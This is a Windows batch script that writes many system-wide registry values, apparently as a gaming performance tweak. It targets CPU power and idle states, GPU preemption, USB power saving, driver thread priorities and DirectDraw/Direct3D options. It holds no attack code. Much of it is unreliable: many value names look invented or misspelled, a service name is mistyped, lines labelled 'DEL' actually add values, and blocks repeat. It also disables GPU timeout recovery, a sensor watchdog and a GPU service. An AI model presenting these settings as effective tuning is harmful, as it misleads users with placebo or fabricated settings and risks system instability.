Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "AllowPepPerfStates" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Cstates" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Capabilities" /t REG_DWORD /d "516198" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighestPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MinimumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Class1InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdle" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuLatencyTimer" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuSlowdown" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "DedicatedSegmentSize" /t REG_DWORD /d "1298" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "Threshold" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuDebuggingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "ProccesorLatencyThrottlingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubDelay" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubPower" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubThreshold" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubType" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValue" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueMaximum" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueMinimum" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueStep" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueManual" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueAutomatic" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDisabledByDefault" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueEnabledByDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultAuto" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultManual" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\NDIS\Parameters" /v "RssBaseCpu" /t REG_DWORD /d "0000000%CPU%" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\NDIS\Parameters" /v "MaxNumRssCpus" /t REG_DWORD /d "%CPU%" /f   
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "BackgroundPriority" /t REG_DWORD /d "24" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "GPU Priority" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "FastDRAM" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "PCIConcur" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\GraphicsDrivers" /v TdrLevel /t REG_DWORD /d 0 /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\GraphicsDrivers" /v TdrDelay /t REG_DWORD /d 60 /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnablePreemption" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "GPUPreemptionLevel" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableAsyncMidBufferPreemption" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableMidGfxPreemptionVGPU" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableMidBufferPreemptionForHighTdrTimeout" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableSCGMidBufferPreemption" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "PerfAnalyzeMidBufferPreemption" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableMidGfxPreemption" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableMidBufferPreemption" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\GpuEnergyDrv" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\GpuEnergyDr" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatencyCheckEnabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Latency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceDefault" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceFSVP" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyTolerancePerfOverride" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceScreenOffIR" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceVSyncEnabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "RtlCapabilityCheckLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "QosManagesIdleProcessors" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DisableVsyncLatencyUpdate" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DisableSensorWatchdog" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "InterruptSteeringDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LowLatencyScalingPercentage" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighestPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MinimumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultMemoryRefreshLatencyToleranceMonitorOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultMemoryRefreshLatencyToleranceNoContext" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaxIAverageGraphicsLatencyInOneBucket" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Latency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MiracastPerfTrackGraphicsLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MonitorLatencyTolerance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "TransitionLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "MonitorLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MonitorLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "RMDisablePostL2Compression" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "RmDisableRegistryCaching" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyActivelyUsed" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyIdleLongTime" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyIdleMonitorOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyIdleNoContext" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyIdleShortTime" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyIdleVeryLongTime" /t REG_DWORD /d "1" /f
cls
for /f %%i in ('wmic path Win32_USBController get PNPDeviceID^| findstr /l "PCI\VEN_"') do (
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%i\Device Parameters" /v "AllowIdleIrpInD3" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%i\Device Parameters" /v "D3ColdSupported" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%i\Device Parameters" /v "DeviceSelectiveSuspended" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%i\Device Parameters" /v "EnableSelectiveSuspend" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%i\Device Parameters" /v "EnhancedPowerManagementEnabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%i\Device Parameters" /v "SelectiveSuspendEnabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%i\Device Parameters" /v "SelectiveSuspendOn" /t REG_DWORD /d "0" /f 
)
timeout /t 1 /nobreak > NUL
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\usbxhci\Parameters" /v "ThreadPriority" /t REG_DWORD /d "31" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\USBHUB3\Parameters" /v "ThreadPriority" /t REG_DWORD /d "31" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\Parameters" /v "ThreadPriority" /t REG_DWORD /d "31" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\NDIS\Parameters" /v "ThreadPriority" /t REG_DWORD /d "31" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\USB" /v "DisableSelectiveSuspend" /t REG_DWORD /d "1" /f 
for %%a in (
	EnhancedPowerManagementEnabled
	AllowIdleIrpInD3
	EnableSelectiveSuspend
	DeviceSelectiveSuspended
	SelectiveSuspendEnabled
	SelectiveSuspendOn
	EnumerationRetryCount
	ExtPropDescSemaphore
	WaitWakeEnabled
	D3ColdSupported
	WdfDirectedPowerTransitionEnable
	EnableIdlePowerManagement
	IdleInWorkingState
) do for /f "delims=" %%b in ('reg query "HKLM\SYSTEM\CurrentControlSet\Enum" /s /f "%%a" ^| findstr "HKEY"') do reg.exe add "%%b" /v "%%a" /t REG_DWORD /d "0" /f 

for /f %%i in ('wmic path Win32_IDEController get PNPDeviceID 2^>nul') do set "str=%%i" & if "!str:PCI\VEN_=!" neq "!str!" (
echo DEL Sata controllers Device Priority
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%i\Device Parameters\Interrupt Management\Affinity Policy" /v "DevicePriority" /f
)

for /f %%i in ('wmic path Win32_USBController get PNPDeviceID') do set "str=%%i" & (
echo.DEL USB Device Priority
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%i\Device Parameters\Interrupt Management\Affinity Policy" /v "DevicePriority" /f
echo.Enable MSI Mode on USB
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%i\Device Parameters\Interrupt Management\MessageSignaledInterruptProperties" /v "MSISupported" /t REG_DWORD /d "1" /f
)
for /f %%u in ('wmic path Win32_USBController get PNPDeviceID^| findstr /l "PCI\VEN_"') do (
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%u\Device Parameters" /v SelectiveSuspendOn /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%u\Device Parameters" /v SelectiveSuspendEnabled /t REG_BINARY /d 00 /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%u\Device Parameters" /v EnhancedPowerManagementEnabled /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%u\Device Parameters" /v AllowIdleIrpInD3 /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%u\Device Parameters\WDF" /v IdleInWorkingState /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%u\Device Parameters" /v SelectiveSuspendOn /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%u\Device Parameters" /v SelectiveSuspendEnabled /t REG_BINARY /d 00 /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%u\Device Parameters" /v EnhancedPowerManagementEnabled /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%u\Device Parameters" /v AllowIdleIrpInD3 /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%u\Device Parameters\WDF" /v IdleInWorkingState /t REG_DWORD /d 0 /f
reg.exe add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "EnhancedPowerManagementEnabled" /t REG_DWORD /d "0" /f
reg.exe add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "AllowIdleIrpInD3" /t REG_DWORD /d "0" /f
reg.exe add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "EnableSelectiveSuspend" /t REG_DWORD /d "0" /f
reg.exe add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "DeviceSelectiveSuspended" /t REG_DWORD /d "0" /f
reg.exe add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "SelectiveSuspendEnabled" /t REG_DWORD /d "0" /f
reg.exe add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "SelectiveSuspendOn" /t REG_DWORD /d "0" /f
reg.exe add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "D3ColdSupported" /t REG_DWORD /d "0" /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%u\Device Parameters" /v SelectiveSuspendOn /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%u\Device Parameters" /v SelectiveSuspendEnabled /t REG_BINARY /d 00 /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%u\Device Parameters\WDF" /v IdleInWorkingState /t REG_DWORD /d 0 /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Enum\%%u\Device Parameters\WDF" /v IdleInWorkingState /t REG_DWORD /d 0 /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "EnhancedPowerManagementEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "AllowIdleIrpInD3" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "DeviceSelectiveSuspended" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "SelectiveSuspendEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "SelectiveSuspendOn" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "fid_D1Latency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "fid_D2Latency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "fid_D3Latency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Enum\%%u\Device Parameters\WDF" /v IdleInWorkingState /t REG_DWORD /d 0 /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "EnhancedPowerManagementEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "AllowIdleIrpInD3" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "DeviceSelectiveSuspended" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "SelectiveSuspendEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "SelectiveSuspendOn" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Enum\%%u\Device Parameters\WDF" /v IdleInWorkingState /t REG_DWORD /d 0 /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "EnhancedPowerManagementEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "AllowIdleIrpInD3" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "DeviceSelectiveSuspended" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "SelectiveSuspendEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%u\Device Parameters" /v "SelectiveSuspendOn" /t REG_DWORD /d "0" /f

)

cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\usbxhci\Parameters" /v "ThreadPriority" /t REG_DWORD /d "31" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\USBHUB3\Parameters" /v "ThreadPriority" /t REG_DWORD /d "31" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\Parameters" /v "ThreadPriority" /t REG_DWORD /d "31" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\NDIS\Parameters" /v "ThreadPriority" /t REG_DWORD /d "31" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl\Parameters" /v "ThreadPriority" /t REG_DWORD /d "15" /f
Reg add "HKLM\SOFTWARE\Microsoft\DirectDraw" /v "DisableAGPSupport" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\DirectDraw" /v "DisableAGPSupport" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\DirectDraw" /v "UseNonLocalVidMem" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\DirectDraw" /v "UseNonLocalVidMem" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Direct3D" /v "UseNonLocalVidMem" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Direct3D" /v "UseNonLocalVidMem" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\DirectDraw" /v "DisableDDSCAPSInDDSD" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\DirectDraw" /v "DisableDDSCAPSInDDSD" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\DirectDraw" /v "EmulationOnly" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\DirectDraw" /v "EmulationOnly" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\DirectDraw" /v "EmulatePointSprites" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\DirectDraw" /v "EmulatePointSprites" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\Direct3D\Drivers" /v "ForceRgbRasterizer" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Direct3D\Drivers" /v "ForceRgbRasterizer" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\DirectDraw" /v "EmulateStateBlocks" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\DirectDraw" /v "EmulateStateBlocks" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\Direct3D" /v "EnableDebugging" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\Direct3D" /v "FullDebug" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\Direct3D" /v "DisableDM" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Direct3D" /v "EnableMultimonDebugging" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\Direct3D" /v "LoadDebugRuntime" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\Direct3D\Drivers" /v "EnumReference" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Direct3D\Drivers" /v "EnumReference" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Direct3D\Drivers" /v "EnumSeparateMMX" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Direct3D\Drivers" /v "EnumSeparateMMX" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Direct3D\Drivers" /v "EnumRamp" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Direct3D\Drivers" /v "EnumRamp" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Direct3D\Drivers" /v "EnumNullDevice" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Direct3D\Drivers" /v "EnumNullDevice" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Direct3D" /v "FewVertices" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Direct3D" /v "FewVertices" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\DirectDraw" /v "DisableMMX" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\DirectDraw" /v "DisableMMX" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\Direct3D" /v "DisableMMX" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Direct3D" /v "DisableMMX" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\Direct3D" /v "MMX Fast Path" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Direct3D" /v "MMX Fast Path" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Direct3D" /v "MMXFastPath" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Direct3D" /v "MMXFastPath" /t Reg_DWORD /d "1" /f
